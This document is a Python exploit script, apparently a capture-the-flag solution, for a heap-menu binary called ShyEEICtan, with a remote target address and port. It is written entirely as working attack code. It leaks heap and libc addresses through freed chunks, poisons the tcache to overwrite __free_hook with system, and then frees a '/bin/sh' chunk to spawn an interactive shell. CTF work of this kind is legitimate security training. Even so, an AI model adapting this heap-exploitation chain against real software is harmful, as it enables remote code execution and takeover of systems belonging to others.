#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './ShyEEICtan'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'3.112.113.4', 'port':20000})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    shy = ShyEEICtan(conn)

    shy.add('0')
    shy.add('1')
    shy.add('2')

    shy.remove(1)
    shy.remove(0)
    addr_heap_base   = u64(shy.list()) - 0x7a0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    for _ in range(5):
        shy.remove(2)

    shy.remove(0)
    shy.remove(2)

    addr_libc_mainarena   = u64(shy.list()) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))
    addr_libc_free_hook = libc.symbols['__free_hook']

    shy.edit(2, p64(addr_libc_free_hook))
    shy.add('/bin/sh\x00')  # 3
    shy.add(p64(addr_libc_system))

    shy.remove(3)

class ShyEEICtan:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, data):
        self.sendlineafter('> ', '1')
        self.sendlineafter('>', data)

    def remove(self, idx):
        self.sendlineafter('> ', '2')
        self.sendlineafter('> ', str(idx))

    def list(self):
        self.sendlineafter('> ', '3')
        self.recvuntil('is:\n')
        return self.recvuntil(' ...', drop=True)

    def edit(self, idx, data):
        self.sendlineafter('> ', '4')
        self.sendlineafter('> ', str(idx))
        self.sendlineafter('>', data)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

#==========
